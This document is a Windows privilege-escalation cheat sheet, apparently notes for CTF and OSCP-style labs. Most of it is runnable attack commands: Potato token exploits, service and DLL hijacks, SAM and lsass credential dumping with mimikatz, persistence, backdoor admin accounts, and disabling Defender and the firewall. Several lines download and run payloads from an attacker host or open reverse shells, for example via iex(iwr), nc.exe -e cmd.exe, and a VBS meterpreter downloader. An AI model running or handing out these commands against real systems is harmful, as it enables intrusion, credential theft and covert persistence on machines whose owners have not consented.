# Windows Privilege Escalation
## Contents 


## Commands  
    ver                                 #OS version    
    systeminfo                          #system information   
    wmic qfe get Caption, Description   #installed updates 
    whoami /priv                        #check privs: if user has priv might be able to use even if disabled  
    whoami /groups                      #groups  
    net user                            #users 
    qwinsta                             #is anyone else logged in?   
    net localgroup  
    ipconfig /all  
    route print  
    dir /r    
    tree /a /f                        #dir walk 
    set                               #enviromental variables  
    net use                           #connected drives  
    net share                         #shared folders
    netstat -ano    
    tasklist /v /fi "username eq system"      #tasks running as SYSTEM  
    wmic product get name,version, vendor       #installed apps and versions 
### Meterpreter   
Token impersonation    

    load incognito
    list_tokens -u   
Getsystem: tries well known priv esc exploits    

    getsystem    
### Powershell
    powershell.exe -nop -ep bypass    
    Get-ExecutionPolicy    
    Set-ExecutionPolicy Unrestricted   
    Set-MpPreference -DisableRealtimeMonitoring $true   
 
## Windows Reference   
### Windows Kernel Versions 

    Kernel 6.1 - Windows 7 / Windows Server 2008 R2  
    Kernel 6.2 - Windows 8 / Windows Server 2012  
    Kernel 6.3 - Windows 8.1 / Windows Server 2012 R2  
    Kernel 10 - Windows 10 / Windows Server 2016 / Windows Server 2019 / Windows 11 / Windows Server 2022
 
### Files to Check       

    %SYSTEMROOT%\System32\drivers\etc\hosts                   #local DNS entries 
    %SYSTEMROOT%\System32\drivers\etc\networks                #network config
    %SYSTEMROOT%\Prefetch                                     #prefetch dir, exe logs
    %WINDIR%\system32\config\AppEvent.Evt                     #application logs
    %WINDIR%\system32\config\SecEvent.Evt                     #security logs
    
## Scripts 
**You might want to check for AV first!**  
For most CTFS all you should need is winPEAS   
[Scripts Reference](https://www.hackingarticles.in/window-privilege-escalation-automated-script/)     
[winPEAS](https://github.com/carlospolop/PEASS-ng/tree/master/winPEAS)   
[Other compiled binaries](https://github.com/r3motecontrol/Ghostpack-CompiledBinaries)  
[nishang](https://github.com/samratashok/nishang)  
[JAWS](https://github.com/411Hall/JAWS)   
[PowerSploit](https://github.com/PowerShellMafia/PowerSploit)   
[PrivEscCheck](https://github.com/itm4n/PrivescCheck)    
[Privesc.ps1](https://github.com/enjoiz/Privesc/blob/master/privesc.ps1)    
[Windows Exploit Suggester (Next-Generation)](https://github.com/bitsadmin/wesng)        
[Sherlock](https://github.com/rasta-mouse/Sherlock)         
[Seatbelt](https://github.com/GhostPack/Seatbelt)      
[Priv2Admin](https://github.com/gtworek/Priv2Admin)    OS priviliges to system     
[Compiled scripts here](https://github.com/Scr1ptK1ddie/WindowsBinaries)   

## Checklists    
[HackTricks](https://book.hacktricks.xyz/windows/checklist-windows-privilege-escalation)  
[Fuzzy security](http://www.fuzzysecurity.com/tutorials/16.html) 

## Privilege Exploits 
[Reference](https://jlajara.gitlab.io/others/2020/11/22/Potatoes_Windows_Privesc.html)   

    whoami /priv running process, can enable for different process if user has priv
    #State: disabled for running process, can enable for different process depending on access
    SeImpersonatePrivilege -> PrintSpoofer, Juicy Potato, Rogue Potato, Hot Potato
    SeAssignPrimaryTokenPrivilege -> Juicy Potato 
    SeTakeOwnershipPrivilege ->  become the owner of any object and modify the DACL to grant access.  
    SeBackup-> 

    If the machine is >= Windows 10 1809 & Windows Server 2019 - Try Rogue Potato
    If the machine is < Windows 10 1809 < Windows Server 2019 - Try Juicy Potato
### Meterpreter Token Impersonation    

    load incognito    
    list_tokens -u       
    impersonate_token domain\\username   #impersonate a domain user   
### PrintSpoofer 
SeImpersonatePrivilege. Windows Server 2016, Server 2019, and Windows 10. 
[Print Spoofer](https://github.com/itm4n/PrintSpoofer)  
[Compiled exe](https://github.com/dievus/printspoofer)  

     PrintSpoofer.exe -i -c cmd

### Hot Potato (Original)    
SeImpersonatePrivilige
Windows 7, 8, 10, Server 2008, and Server 2012. Patched. 
exe: [Potato](https://github.com/foxglovesec/Potato/)     

     Potato.exe -ip -cmd [cmd to run] -disable_exhaust true -disable_defender true  
     
Powershell: [Tater](https://github.com/Kevin-Robertson/Tater). Need to bypass powershell execution policy. Upload Tater and import.    
     Import-Module Tater.ps1 
     Invoke-Tater -Trigger 1 -Command "net localgroup administrators user /add"   

### Juicy Potato   
Look for SeImpersonate or SeAssignPrimaryToken 
[binaries](https://github.com/ohpe/juicy-potato)  
[CLSIDS](http://ohpe.it/juicy-potato/CLSID/)   

     juicypotato.exe -l 1337 -p c:\windows\system32\cmd.exe -t * -c {F87B28F1-DA9A-4F35-8EC0-800EFCF26B83}

### Rogue Potato   
[Blog post](https://decoder.cloud/2020/05/11/no-more-juicypotato-old-story-welcome-roguepotato/)   
[Code](https://github.com/antonioCoco/RoguePotato)  

run redirector on kali and exe on victim:

     socat tcp-listen:135,reuseaddr,fork tcp:VICTIM_IP:9999
     .\RoguePotato.exe -r YOUR_IP -e "command" -l 9999   
     test cmd: -e "cmd.exe /c ping YOUR_IP"  
     shell cmd: -e "powershell -c iex( iwr http://[YOUR_IP]/shell.ps1 -UseBasicParsing )"   
     using nishang web shell 
    
## Service Exploits 
    tasklist /svc 
    sc query 
    net start/stop service  
### Insecure Service Properties   
Dangerous perms: SERVICE_CHANGE_CONFIG, SERVICE_ALL_ACCESS 

    sc qc [service name]  
### Unquoted Service Paths   
Need unquoted service path and ability to start service 

    wmic service get name,displayname,pathname,startmode |findstr /i "Auto" |findstr /i /v "C:\Windows\\" 2>nul |findstr /i /v """   
    sc qc [service name]        #to check what account service runs under 
    powershell "get-acl -Path 'C:\Program Files (x86)\Service Folder' | format-list"     #to check dir perms 
    
Generate exe and upload   

    msfvenom -p windows/exec CMD='net localgroup administrators user /add' -f exe-service -o common.exe  
    sc start service  
### Weak Registry Permissions
### Insecure Service Executables   
    icalcs Shared  
    accesschk.exe -uwcqv "Everyone" *
    accesschk.exe -uwcqv "Authenticated Users" *
    accesschk.exe -uwcqv "Users" *
### Scheduled Tasks
    schtasks /query /fo LIST 2>nul | findstr TaskName  
    dir C:\windows\tasks  
### DLL Search Order Hijacking  
[Windows Server 2008-2019](https://itm4n.github.io/windows-server-netman-dll-hijacking/)   

    accesschk.exe /accepteula -uvqc user [service name]             #look for: SERVICE_STOP, SERVICE_START    

Find service with a DLL that isn't found, able to start/stop service and searched location is in a writeable directory. Also need C source code- transfer to Kali - insert line then compile.  

    system("cmd.exe /k net localgroup administrators user /add");             #line to insert in C code
    
    x86_64-w64-mingw32-gcc windows_dll.c -shared -o hijackme.dll              #compile on Kali then transfer   
### Binpath  
Look for SERVICE_CHANGE_CONFIG and SERVICE_START     
Windows XP SP1 - upnphost service and dependant service. [Ref](https://sohvaxus.github.io/content/winxp-sp1-privesc.html)  

     accesschk.exe /accepteula -wuvc [svc name]         
     
     sc config [svc name] binpath= "net localgroup administrators [username] /add"   
     sc start [service name]   
## Registry Exploits
### Autoruns   
Search

    reg query HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Run  
    reg query HKLM:\SOFTWARE\Microsoft\Windows\CurrentVersion\RunOnce  
    reg query HKCU:\SOFTWARE\Microsoft\Windows\CurrentVersion\Run 
    reg query HKCU:\SOFTWARE\Microsoft\Windows\CurrentVersion\RunOnce

Confirm perms - overwrite the program? (May need to upload accesschk) 

    accesschk /accepteula -wvu "C:\Program Files\Autorun Program\program.exe"
### AlwaysInstallElevated
    reg query HKLM\SOFTWARE\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated
    reg query HKCU\SOFTWARE\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated
    msfvenom -p windows/x64/shell_reverse_tcp LHOST=<ip> LPORT=53 -f msi -o reverse.msi /quiet /i reverse.msi
    #upload reverse shell to C:\temp and run    
    msiexec /quiet /qn /i C:\Temp\reverse.msi
## Passwords  
Use creds locally:     

    C:\Windows\System32\runas.exe /noprofile /user:<username> <password> "c:\users\Public\nc.exe -nc <attacker-ip> 4444 -e cmd.exe"       
    PsExec64.exe /accepteula -i -u admin -p password C:\Temp\reverse.exe      
Search for creds:   

[LaZagne](https://github.com/AlessandroZ/LaZagne/tree/master): search for creds.    

    laZagne.exe all    
Hidden Files  

    PS > Get-ChildItem -Hidden -Path C:\Users\admin\Desktop\     
Run from C:\ (recursive search).  

    findstr /si password *.xml *.ini *.txt *.config 2>nul    
    dir /s *pass* == *vnc* == *.config* 2>nul    
    dir /s *sysprep.inf *sysprep.xml *unattended.xml *unattend.xml *unattend.txt 2>nul    
    
DMP Files (possible base64 passwords)  - find or create from processes

    strings /root/Desktop/iexplore.DMP | grep "Authorization: Basic"    
    
Unattend files (could contain base64 encoded passwords):   

    C:\unattend.xml
    C:\Windows\Panther\Unattend.xml
    C:\Windows\Panther\Unattend\Unattend.xml
    C:\Windows\system32\sysprep.inf
    C:\Windows\system32\sysprep\sysprep.xml
    
### Saved creds   

    reg query "HKLM\SOFTWARE\Microsoft\Windows NT\Currentversion\Winlogon" 2>nul | findstr "DefaultUserName DefaultDomainName DefaultPassword" 
    cmdkey /list   
    dir C:\Users\username\AppData\Local\Microsoft\Credentials\   
    dir C:\Users\username\AppData\Roaming\Microsoft\Credentials\   
    runas /savecred /user:[user name] C:\PrivEsc\reverse.exe  

### Creds in Registry 
    reg query HKLM /f password /t REG_SZ /s
    reg query HKCU /f password /t REG_SZ /s 
### SAM and SYSTEM Files
    %SYSTEMROOT%\repair\SAM
    %SYSTEMROOT%\System32\config\RegBack\SAM
    %SYSTEMROOT%\System32\config\SAM
    %SYSTEMROOT%\repair\system
    %SYSTEMROOT%\System32\config\SYSTEM
    %SYSTEMROOT%\System32\config\RegBack\system 
### Extracting SAM and SYSTEM    
[CVE-2021-36934, the SeriousSAM local privilege escalation](https://github.com/HuskyHacks/ShadowSteal)  
Extract Mmanually or use [mimikatz](https://github.com/gentilkiwi/mimikatz) 

Manually:

     reg.exe save HKLM\SAM sam.bak 
     reg.exe save HKLM\SYSTEM system.bak 
     *transfer files to attack box then dump* 
     python3 /usr/local/bin/secretsdump.py -sam sam.bak -system system.bak LOCAL 
     
     #dump local passwords with Impacket
     pwdump.py sys_backup.hiv sec_backup.hiv
     
     #dump LSA secrets with Impacket
     lsadump.py sys_backup.hiv sec_backup.hiv          

Extract hashes with Mimikatz (Windows Defender will catch this so it's better to use the below method):    

     privilege::debug 
     token::elevate 
     lsadump::sam  
     
Dump lsass, then use Mimikatz to extract hashes locally (Windows Defender shouldn't catch this):   

     .\procdump64.exe -accepteula -ma lsass.exe lsass.dmp    
     #then run the below commands on a local Window box   
     .\mimikatz.exe      
     mim# sekurlsa::minidmp lsass.dmp        
     mim# sekurlsa::logonPasswords full    
 
*then crack hashes or use pass the hash to login* 
[Online hash cracker](https://crackstation.net/) 
     
## Kernel exploits   
Check system architechure:

    systeminfo | findstr /B /C:"OS Name" /C:"OS Version"     
    
Check for Hotfixes:    

    wmic qfe get Caption,Description,HotFixID,InstalledOn     

Tools to use   
https://github.com/bitsadmin/wesng      
https://github.com/rasta-mouse/Watson   
### Kernel Exploit Isn't Working
[x32-bit vs x64-bit](https://spencerdodd.github.io/2017/07/20/WOW64/) 
Check arch of running Powershell process (could get a 32 bit process on 64 bit machine if payload uses relative path)

    #32 bit 
    [IntPtr]::size -eq 4       
    
    #64 bit
    [IntPtr]::size -eq 8
    [Environment]::Is64BitProcess
    
Absolute PowerShell executable paths:

    #32-bit (x86)
    C:\Windows\SysWow64\WindowsPowerShell\v1.0\powershell.exe
    C:\Windows\system32\WindowsPowerShell\v1.0\powershell.exe

    #64-bit (x64) 
    C:\Windows\system32\WindowsPowerShell\v1.0\powershell.exe
    C:\Windows\SysNative\WindowsPowerShell\v1.0\powershell.exe
    
### Precompiled Kernel Exploits
https://github.com/SecWiki/windows-kernel-exploits   

## Misc  
[Print Demon](https://windows-internals.com/printdemon-cve-2020-1048/)  
[SYSTEM Nightmare](https://github.com/GossiTheDog/SystemNightmare) Print nightmare implementation   
[CVE 2019-1388](https://github.com/jas502n/CVE-2019-1388)   
[Windows 10 Exploits](https://github.com/nu11secur1ty/Windows10Exploits)    
____   

# Transferring Files    
[Living off the Land](https://lolbas-project.github.io/#)      
[Reference - 15 ways to download files](https://www.netspi.com/blog/technical/network-penetration-testing/15-ways-to-download-a-file/)     
[Windows oneliners to download remote payload and execute arbitrary code](https://arno0x0x.wordpress.com/2017/11/20/windows-oneliners-to-download-remote-payload-and-execute-arbitrary-code/)   
[Windows One liners for file uploading](https://www.asafety.fr/en/vuln-exploit-poc/windows-dos-powershell-upload-de-fichier-en-ligne-de-commande-one-liner/)     

**try certutil or impacket first - sometimes Powershell has problems, check size of file to see if transfer was successful** 
Windows XP and earlier: TFTP, Impacket
Windows 7 - 8.1: Certutil, Impacket, PowerShell 
Windows 10: Certutil, Impacket, Curl, Powershell 

### Certutil 
    certutil.exe -urlcache -split -f "http://$IP/file.bat" file.bat    
    
### Old Boxes (Windows XP and before)  
For PWK labs - TFTP usually enabled 
metasploit tfp server module on Kali

    tftp -i 192.168.119.10 PUT secrets.txt   
    
 ## Impacket 
 [Data Exfiltration Techniques](https://www.pentestpartners.com/security-blog/data-exfiltration-techniques/)    
 [Reference - Exfil Files from Windows Manually](https://isroot.nl/2018/07/09/post-exploitation-file-transfers-on-windows-the-manual-way/)  
 
     sudo python3 /usr/share/doc/python3-impacket/examples/smbserver.py kali .                         #only on a trusted network (no password)   
     sudo python3 /usr/share/doc/python3-impacket/examples/smbserver.py share . -smb2support -username USER -password PASS        
     net use \\IP\share /USER:USER PASS    
     copy \\10.6.85.85\kali\shell.exe C:\PrivEsc\shell.exe               #download from kali   
     copy C:\File \\[attack ip]\shareName\File                           #upload to kali  
    
## Powershell    

    powershell -c wget "http://$IP/file.exe" -outfile "file.exe"   
    powershell "(New-Object System.Net.WebClient).DownloadFile('$IP','$PORT')"   
    powershell Invoke-WebRequest -Uri http://$IP:$PORT/PowerUp.ps1 -OutFile C:\Windows\Temp\out  
    powershell -ep bypass iex (iwr http://$IP/shell.ps1 -useb) 
    
    IEX(New-Object Net.WebClient).downloadString('http://server/script.ps1')

## VBS     

    echo Set o=CreateObject^("MSXML2.XMLHTTP"^):Set a=CreateObject^("ADODB.Stream"^):Set f=Createobject^("Scripting.FileSystemObject"^):o.open "GET", "http://<attacker ip>/meterpreter.exe", 0:o.send^(^):If o.Status=200 Then > "C:\temp\download.vbs" &echo a.Open:a.Type=1:a.Write o.ResponseBody:a.Position=0:If f.Fileexists^("C:\temp\meterpreter.exe"^) Then f.DeleteFile "C:\temp\meterpreter.exe" >> "C:\temp\download.vbs" &echo a.SaveToFile "C:\temp\meterpreter.exe" >>"C:\temp\download.vbs" &echo End if >>"C:\temp\download.vbs" &cscript //B "C:\temp\download.vbs" &del /F /Q "C:\temp\download.vbs"

## XM File Creation (Using copy and paste)
    PS C:\> $console = [XML] @"
    <XML CODE CODE HERE>
    "@
    /# write the xml to file:
    PS C:\> $console.save("C:\users\burmat\documents\console.xml") 
    
 ## Windows 10 - curl
    curl http://server/file -o file
    curl http://server/file.bat | cmd
 ____   

 ## Network Scanning / Enum 
 [Static Windows binaries](https://github.com/andrew-d/static-binaries/tree/master/binaries/windows) 
 
    for /L %i in (1,1,255) do @ping -n 1 -w 200 192.168.1.%i > nul && echo 192.168.1.%i is up.     
    route print 
    arp -a  
    C:\Windows\System32\drivers\etc\host        Windows DNS entries  
 ____
 # Persistence 
 Methods: service, registry keys, startup folders, scheduled tasks, WMI permanent events.
 
     net user USERNAME PASSWORD /add
     net localgroup Administrators USERNAME /add
     net localgroup "Remote Management Users" USERNAME /add    
     
 Metasploit Modules:  
 
     exploit/windows/local/persistence_service   #to add a service    
     exploit/windows/local/wmi_persistence       #wmi event subscription, triggered with logon failures (event ID 4625)   
 ## Access  
     pass the hash: evil-winrm -u Administrator -H ADMIN_HASH -i IP  
     xfreerdp /v:IP /u:USERNAME /p:PASSWORD +clipboard /dynamic-resolution /drive:/usr/share/windows-resources,share   
     \\tsclient\share\mimikatz\x64\mimikatz.exe   

____ 
# Post Exploitation  
## Checklist
Check to see if device is dual home:

    ipconfig /all
    arp -a
    route print    
Dump SAM and SYSTEM, then extract hashes with impacket scripts. Crack passwords.    
## Access 
### Persistence Methods   
https://persistence-info.github.io/   

### Pass the Hash with winexe

    pth-winexe //192.168.149.10 -U Administrator%aad3b435b51404eeaad3b435b51404ee:2892d26cdf84d7a70e2eb3b9f05c425e cmd   
### WinRM
 Enabled WinRm as Administrator to use evil-winrm. -H to pass the hash
 
     WinRM quickconfig       
 
### Enabling RDP  
Add a user with RDP / admin privs 

    net user evil 3v1lPass /add
    net localgroup Administrators evil /add
    net localgroup "Remote Desktop Users" evil /ADD

Enable RDP 

    reg add "HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\Terminal Server" /v fDenyTSConnections /t REG_DWORD /d 0 /f

Turn firewall off

    netsh firewall set opmode disable
    or
    reg add "HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\Terminal Server" /v fDenyTSConnections /t REG_DWORD /d 0 /f

If you get this error:
"ERROR: CredSSP: Initialize failed, do you have correct kerberos tgt initialized ?
Failed to connect, CredSSP required by server.""
Add this reg key:

    reg add "HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\Terminal Server\WinStations\RDP-Tcp" /v UserAuthentication /t REG_DWORD /d 0 /f
    
## AV Evasion  
 ### Check for AV  
 
 Check on Workstations
     wmic /namespace:\\root\securitycenter2 path antivirusproduct   
     PS > Get-CimInstance -Namespace root/SecurityCenter2 -ClassName AntivirusProduct   
 Check for Windows Defender Service 
 
     sc query windefend 
     PS > Get-MpComputerStatus | select RealTimeProtectionEnabled   #check for status for elements like Anti-Spyware, Antivirus, etc.   
     "C:\Program Files\Windows Defender\MpCmdRun.exe" -RemoveDefinitions -All               #Delete all rules of Defender (useful for machines without internet access)   
     PS > Get-MpThreat    #threats ID'd by Defender  
 SysMon 
 
     PS > Get-Process | Where-Object { $_.ProcessName -eq "Sysmon" }  
     PS > Get-CimInstance win32_service -Filter "Description = 'System Monitor service'"  
     reg query HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\WINEVT\Channels\Microsoft-Windows-Sysmon/Operational   
     findstr /si '<ProcessCreate onmatch="exclude">' C:\tools\*      #if sysmon is installed, try to read config file    
 ____
 
# Resources
## Cheat Sheets and Guides 
https://burmat.gitbook.io/security/hacking/one-liners-and-dirty-scripts  
https://www.absolomb.com/2018-01-26-Windows-Privilege-Escalation-Guide/   
https://securism.wordpress.com/oscp-notes-privilege-escalation-windows/   
https://github.com/haktanemik/windows-priv  

## Learn More
https://www.roguesecurity.in/2018/12/02/a-guide-for-windows-penetration-testing/      
https://github.com/frizb/Windows-Privilege-Escalation    
https://toshellandback.com/2015/11/24/ms-priv-esc/

  
